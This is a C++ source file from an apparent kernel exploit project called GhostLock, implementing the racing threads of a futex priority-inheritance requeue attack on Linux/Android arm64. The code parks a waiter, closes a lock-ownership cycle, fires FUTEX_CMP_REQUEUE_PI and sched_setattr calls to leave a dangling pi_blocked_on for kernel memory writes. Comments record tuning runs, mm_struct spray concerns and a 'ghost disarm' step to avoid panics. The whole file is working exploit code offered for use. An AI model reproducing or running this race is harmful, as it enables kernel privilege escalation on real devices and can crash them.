/*
 * GhostLock — PI race worker threads and the per-write route entry.
 *
 * Split out of main.cpp; the statement order and log text are unchanged.
 */

#include "race/threads.hpp"

#include "attack/ops.hpp"
#include "profile/model.h"
#include "route/route_controller.h"
#include "route/route_policy.hpp"
#include "session/exploit_session.hpp"

#include <fcntl.h>
#include <unistd.h>
#include <cstdio>
#include <cstring>

using namespace ghostlock;

namespace {
    /* v8 route_done beat probe: one tid -> "tid=N syscall=<first> wchan=<text>".
     * The route_done deadline produced 300s of silence in the v8diag runs; the
     * beat converts that silence into evidence (who is stuck where) without
     * stdio buffering. Reads fail cleanly on a dead tid. */
    void probe_tid(int32_t tid, char *dst, size_t cap) {
        if (dst == nullptr || cap == 0) return;
        dst[0] = '\0';
        if (tid <= 0) {
            snprintf(dst, cap, "-");
            return;
        }
        char path[48];
        char buf[128];
        snprintf(path, sizeof(path), "/proc/%d/syscall", tid);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            const ssize_t got = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (got > 0) {
                buf[got] = '\0';
                for (ssize_t i = 0; i < got; i++) {
                    if (buf[i] == '\n' || buf[i] == '\r') buf[i] = ' ';
                }
                size_t len = strlen(buf);
                while (len > 0 && buf[len - 1] == ' ') buf[--len] = '\0';
                char first[24] = "";
                size_t j = 0;
                while (j < len && buf[j] != ' ' && j + 1 < sizeof(first)) {
                    first[j] = buf[j];
                    j++;
                }
                first[j] = '\0';
                snprintf(dst, cap, "tid=%d syscall=%s", tid,
                         first[0] ? first : "empty");
            }
        }
        if (dst[0] == '\0') {
            snprintf(dst, cap, "tid=%d syscall=?", tid);
        }
        snprintf(path, sizeof(path), "/proc/%d/wchan", tid);
        fd = open(path, O_RDONLY);
        if (fd >= 0) {
            const ssize_t got = read(fd, buf, sizeof(buf) - 1);
            close(fd);
            if (got > 0) {
                buf[got] = '\0';
                for (ssize_t i = 0; i < got; i++) {
                    if (buf[i] == '\n' || buf[i] == '\r') buf[i] = ' ';
                }
                size_t len = strlen(buf);
                while (len > 0 && buf[len - 1] == ' ') buf[--len] = '\0';
                const size_t used = strlen(dst);
                snprintf(dst + used, cap - used, " wchan=%s",
                         len > 0 ? buf : "running");
            }
        } else {
            const size_t used = strlen(dst);
            snprintf(dst + used, cap - used, " wchan=?");
        }
    }

    /* CLI-proven firing discipline (ghostlock-oneplus main.c:194): before the
     * first sched_setattr of a seq, wait until the waiter provably entered
     * select — /proc/<tid>/syscall == 72 (pselect6 on arm64; bionic select()
     * wraps pselect6) AND wchan contains do_select, i.e. the fd_set copy is
     * already on the kernel stack and the stale waiter is fully overlaid.
     * Without this, the blind delay ladder can fire while the waiter is still
     * in copy_from_user (chain reads half-written words) or before it entered
     * select at all. On 800ms timeout fire anyway (best effort), like CLI. */
    int32_t proc_first_int_of(const char *path) {
        char buf[64] = {0};
        const int fd = open(path, O_RDONLY | O_CLOEXEC);
        if (fd < 0) return -1;
        const ssize_t n = read(fd, buf, sizeof(buf) - 1);
        close(fd);
        if (n <= 0) return -1;
        return static_cast<int32_t>(strtol(buf, nullptr, 10));
    }

    int waiter_ready_in_select(int32_t tid, long timeout_us,
                               long *used_usec, int32_t *last_syscall) {
        char path[48];
        struct timespec t0, t1;
        clock_gettime(CLOCK_MONOTONIC, &t0);
        int32_t seen = -1;
        int hit = 0;
        long elapsed = 0;
        snprintf(path, sizeof(path), "/proc/self/task/%d/syscall", tid);
        for (;;) {
            seen = proc_first_int_of(path);
            if (seen == 72 /* pselect6 */) {
                char wpath[48];
                char wbuf[64] = {0};
                snprintf(wpath, sizeof(wpath), "/proc/self/task/%d/wchan", tid);
                const int wfd = open(wpath, O_RDONLY);
                int in_do_select = 0;
                if (wfd >= 0) {
                    const ssize_t n = read(wfd, wbuf, sizeof(wbuf) - 1);
                    close(wfd);
                    if (n > 0 && strstr(wbuf, "do_select") != nullptr)
                        in_do_select = 1;
                }
                /* wchan=do_select => fd_set copy already on the kernel stack;
                 * otherwise one 300us beat covers the copy window. */
                if (!in_do_select) usleep(300);
                hit = 1;
            }
            clock_gettime(CLOCK_MONOTONIC, &t1);
            elapsed = static_cast<long>(
                (t1.tv_sec - t0.tv_sec) * 1000000L +
                (t1.tv_nsec - t0.tv_nsec) / 1000L);
            if (hit || elapsed >= timeout_us) break;
            usleep(20);
        }
        if (used_usec) *used_usec = elapsed;
        if (last_syscall) *last_syscall = seen;
        return hit;
    }
} // namespace

namespace ghostlock::race {
    void *waiter_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        const memory::WriteRequest *request = race->request;
        support::disable_rseq_for_thread();
        int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
        race->waiter_tid.store(tid);
        /* v11: restore the full CLI chain handshake (main.c:149, 6/6 on this
         * exact kernel). The waiter must OWN the chain futex while the CMP
         * requeue parks it on target (held by the owner); the owner then
         * blocks on the chain, closing the waiter->target->owner->chain
         * cycle. The kernel's PI requeue/boost walk mishandles that cycle
         * and wakes the waiter with a dangling pi_blocked_on — the premise
         * of the whole route. v6 removed both LOCK_PI calls after an
         * EDEADLK that the CLI avoids by firing CMP from the main thread
         * strictly after owner_started + a 50ms settle, which run() already
         * matches (race_setup_settle_us=50000). Without the cycle the wakeup
         * clears pi_blocked_on and rt_mutex_adjust_pi short-circuits: the
         * route reports clean=1/1 and never writes (run15 proof). */
        long chain_lock = support::futex_op(&race->chain_futex,
                                            FUTEX_LOCK_PI, 0, nullptr,
                                            nullptr, 0);
        if (chain_lock != 0) {
            pr_error("waiter lock chain errno=%d\n", errno);
        }
        race->waiter_ready.store(1);
        while (!race->owner_started.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        struct timespec timeout;
        SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
        if (race->fast_repair.load()) {
            timeout.tv_nsec += 20000000L;
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        } else {
            uint64_t wait_ns =
                    static_cast<uint64_t>(session::g_exploit_session.profile.race_route_wait_ms()) * 1000000ULL;
            timeout.tv_sec += static_cast<time_t>(wait_ns / 1000000000ULL);
            timeout.tv_nsec += static_cast<long>(wait_ns % 1000000000ULL);
            if (timeout.tv_nsec >= 1000000000L) {
                timeout.tv_sec++;
                timeout.tv_nsec -= 1000000000L;
            }
        }
        race->waiter_waiting.store(1);
        support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
                          &race->target_futex, 0);
        route::RouteController controller;
        controller.init(race, &session::g_exploit_session.profile);
        race->route_status = controller.execute(request);
        if (controller.fallback_used) {
            pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
        }
        if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
            /* remove_waiter() left this thread's pi_blocked_on pointing at the
         * reclaimed stack waiter. Force one final slow-path removal while the
         * stack frame is still alive, matching the 5.x multicast primitive's
         * disarm step. Without this, thread exit leaves a walkable dangling
         * ghost and the next mm_struct spray can panic the kernel. */
            uint32_t dummy_pi = 0x80000000U | static_cast<uint32_t>(getpid());
            struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
            errno = 0;
            long disarm = support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, nullptr, 0);
            pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
        }
        race->route_done.store(1);
        /* v11: release the chain so the owner's blocking LOCK_PI wakes and
         * marks owner_chain_done (CLI main.c:163) — same ordering. */
        (void) support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0,
                                 nullptr, nullptr, 0);
        /* v11: the UNLOCK_PI above is what wakes the owner's blocking
         * LOCK_PI, so owner_chain_done is normally set before this poll
         * even runs once. */
        while (!race->owner_chain_done.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        return nullptr;
    }

    void *owner_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        race->owner_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
        long lock_target = support::futex_op(
            &race->target_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0);
        if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
        while (!race->waiter_ready.load() &&
               !race->owner_stop.load())
            usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
        if (race->owner_stop.load()) {
            if (lock_target == 0)
                support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
            return nullptr;
        }
        race->owner_started.store(1);
        /* v11: restore the CLI owner handshake (main.c:170): block on the
         * chain futex held by the waiter. This closes the ownership cycle
         * before the CMP requeue fires; the waiter's post-route UNLOCK_PI
         * wakes us here. The v6 "no chain LOCK" workaround silently removed
         * the cycle and with it the dangling pi_blocked_on the route lives
         * on (run15: clean=1/1, zero writes). */
        long chain_block = support::futex_op(&race->chain_futex,
                                             FUTEX_LOCK_PI, 0, nullptr,
                                             nullptr, 0);
        if (chain_block != 0) {
            pr_error("owner lock chain errno=%d\n", errno);
        }
        race->owner_chain_done.store(1);
        while (!race->owner_stop.load()) sleep(1);
        if (lock_target == 0)
            support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
        return nullptr;
    }

    void *consumer_thread(void *arg) {
        auto *race = static_cast<PiRace *>(arg);
        support::disable_rseq_for_thread();
        race->consumer_tid.store(static_cast<int32_t>(syscall(SYS_gettid)));
        kernel::pin_to_core(static_cast<size_t>(race->consumer_cpu));
        pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
        int32_t seen = 0;
        while (!race->consumer_stop.load()) {
            int32_t seq = race->consumer_go.load();
            if (seq == 0 || seq == seen) {
                __asm__ volatile (


                "yield"
                ::: "memory");
                continue;
            }
            seen = seq;
            int32_t tid = race->waiter_tid.load();
            int32_t calls_this_seq = 0;
            while (!race->consumer_stop.load() &&
                   race->consumer_go.load() == seq) {
                uint32_t delay_usec = race->route_delay_usec.load();
                if (calls_this_seq == 0) {
                    /* v9: CLI-proven ready poll before the first fire — do
                     * not sched_setattr until the waiter is provably inside
                     * select (see waiter_ready_in_select note above). */
                    long used_us = 0;
                    int32_t last_sc = -1;
                    const int ready = waiter_ready_in_select(
                        tid, 800000, &used_us, &last_sc);
                    pr_info("consumer poll-waiter seq=%d tid=%d ready=%d "
                            "used_us=%ld last_syscall=%d\n",
                            seq, tid, ready, used_us, last_sc);
                    if (!ready && delay_usec > 0)
                        usleep(static_cast<useconds_t>(delay_usec));
                } else if (delay_usec > 0) {
                    usleep(static_cast<useconds_t>(delay_usec));
                }
                for (uint32_t burst = 0;
                     burst < session::g_exploit_session.profile.select_consumer_burst_calls(); burst++) {
                    if (race->consumer_stop.load() ||
                        race->consumer_go.load() != seq)
                        break;
                    race->consumer_calls.fetch_add(1);
                    race->consumer_inflight.store(1);
                    errno = 0;
                    /* rotate the nice every call; (calls%19)+1 is what makes
                 * sched_setattr succeed on 6.1 compact */
                    int32_t consumer_nice = session::g_exploit_session.profile.has_compact_waiter()
                                            ? (calls_this_seq % 19) + 1
                                            : kernel::PSELECT_CONSUMER_NICE;
                    long sched_ret = support::sched_setattr_tid(tid, consumer_nice);
                    const int32_t sched_errno = (sched_ret != 0) ? errno : 0;
                    /* v8: this call is the PI-chain trigger; if it never
                     * returns the chain is stuck inside sched_setattr and the
                     * beat dump shows syscall=274 (sched_setattr) on this tid. */
                    pr_info("consumer sched tid=%d nice=%d ret=%ld errno=%d\n",
                            tid, consumer_nice, sched_ret, sched_errno);
                    if (sched_ret != 0) {
                        struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
                        long fret = support::futex_op(
                            &race->target_futex, FUTEX_LOCK_PI, 0, &ft, nullptr, 0);
                        if (fret == 0) {
                            support::futex_op(
                                &race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
                            sched_ret = 0;
                        }
                    }
                    if (sched_ret == 0) race->consumer_success.fetch_add(1);
                    race->consumer_inflight.store(0);
                    calls_this_seq++;
                    if (static_cast<uint32_t>(calls_this_seq) >=
                        session::g_exploit_session.profile.select_consumer_max_calls()) {
                        race->consumer_go.store(0);
                        break;
                    }
                }
            }
        }
        return nullptr;
    }

    void reset_main_route_state(void) {
        int32_t fast_repair = session::g_exploit_session.race.fast_repair.load();
        if (!session::g_exploit_session.race.reset(
            fast_repair ? 5000 : session::g_exploit_session.profile.select_enter_delay_us(),
            config::runtime_config_snapshot().main_cpu,
            config::runtime_config_snapshot().consumer_cpu)) {
            support::fail_stop_dirty_race("reset with live PI workers", EBUSY);
        }
        session::g_exploit_session.race.fast_repair.store(fast_repair);
    }
} // namespace ghostlock::race

/* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
 * route outcome once the waiter reported completion. The count/timeout policy
 * lives in outcome_with_counters() and TODO(pi-timeout-01). */
ghostlock::route::RouteStatus ghostlock::race::PiRace::run() noexcept {
    while (!waiter_waiting.load() || !owner_started.load())
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    pr_info("[route] waiter parked; owner started\n");
    usleep(fast_repair.load()
               ? 5000
               : session::g_exploit_session.profile.race_setup_settle_us());
    /* 5.10 EDEADLK probe: futex_lock_pi_atomic rejects the proxy trylock
     * with -EDEADLK when target_futex's user value already carries the
     * requeued waiter's own TID (kernel/futex.c:1371). Dump the exact
     * userspace state at CMP time so the run log shows who holds what. */
    pr_info("[route] CMP probe: target_uval=%u wait_uval=%u waiter_tid=%d "
            "owner_tid=%d cmp_tid=%d\n",
            target_futex, wait_futex, waiter_tid.load(),
            owner_tid.load(), static_cast<int32_t>(syscall(SYS_gettid)));
    errno = 0;
    long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                reinterpret_cast<void *>(1),
                                &target_futex, 0);
    pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
            rq, errno);
    /* TODO(pi-timeout-01): This wait has no deadline. A route that stalls in
     * the race window (observed when the Shizuku log pipe applied
     * backpressure) parks the process forever and the corrupted PI chain is
     * never disarmed. Bound the wait from profile::TargetProfile.execution and map a
     * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
    struct timespec wait_started{};
    SYSCHK(clock_gettime(CLOCK_MONOTONIC, &wait_started));
    const double timeout_ms = static_cast<double>(
        session::g_exploit_session.profile.race_route_done_timeout_ms());
    int32_t beat_polls = 0;
    while (!route_done.load()) {
        const double elapsed_ms = runtime_time::runtime_elapsed_ms(&wait_started);
        if (elapsed_ms >= timeout_ms) {
            return route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 21,
                .error_number = ETIMEDOUT,
            };
        }
        /* v8 beat: every ~2s at the 1ms poll interval, dump both PI workers'
         * kernel state so a hung route names its culprit instead of dying in
         * silence at the deadline. */
        if (++beat_polls >= 2000) {
            beat_polls = 0;
            char w_buf[160];
            char c_buf[160];
            char o_buf[160];
            probe_tid(waiter_tid.load(), w_buf, sizeof(w_buf));
            probe_tid(consumer_tid.load(), c_buf, sizeof(c_buf));
            probe_tid(owner_tid.load(), o_buf, sizeof(o_buf));
            pr_info("[route] beat +%.0fs %s %s %s calls=%d success=%d "
                    "inflight=%d go=%d\n", elapsed_ms / 1000.0, w_buf, c_buf,
                    o_buf, consumer_calls.load(), consumer_success.load(),
                    consumer_inflight.load(), consumer_go.load());
        }
        usleep(session::g_exploit_session.profile.race_state_poll_interval_us());
    }
    const route::RouteStatus status = route_status;
    const int32_t calls = consumer_calls.load();
    const int32_t success = consumer_success.load();
    pr_info("[route] route_done status=%d clean=%d/%d step=%d errno=%d "
            "calls=%d success=%d\n", status.code, status.userspace_clean,
            status.kernel_disarmed, status.step, status.error_number,
            calls, success);
    return outcome_with_counters(status, calls, success);
}

namespace ghostlock::race {
    /* Create, synchronize, stop and join one explicitly owned PI race. */
    Status run_main_route_threads(const memory::WriteRequest &request) {
        reset_main_route_state();
        pr_info("[route] creating waiter/owner/consumer\n");
        int32_t error = session::g_exploit_session.race.start_threads(
            waiter_thread, owner_thread, consumer_thread, &request);
        if (error) {
            if (session::g_exploit_session.race.route_status.code ==
                route::ROUTE_DIRTY_FAILURE) {
                support::fail_stop_dirty_race(
                    "partial PI worker startup cleanup", error);
            }
            session::g_exploit_session.race.route_status = route::RouteStatus{
                .code = route::ROUTE_DIRTY_FAILURE,
                .step = 20,
                .error_number = error,
            };
            pr_warning("PI race thread creation failed errno=%d\n", error);
            return 0;
        }
        route::RouteStatus status = session::g_exploit_session.race.run();
        if (status.code == route::ROUTE_DIRTY_FAILURE) {
            support::fail_stop_dirty_race("route_done deadline", status.error_number);
        }
        session::g_exploit_session.race.request_stop();
        const int32_t join_error = session::g_exploit_session.race.join();
        if (join_error != 0) {
            support::fail_stop_dirty_race("PI worker join", join_error);
        }
        pr_info("[route] threads joined\n");
        return status.code == route::ROUTE_OK;
    }
} // namespace ghostlock::race
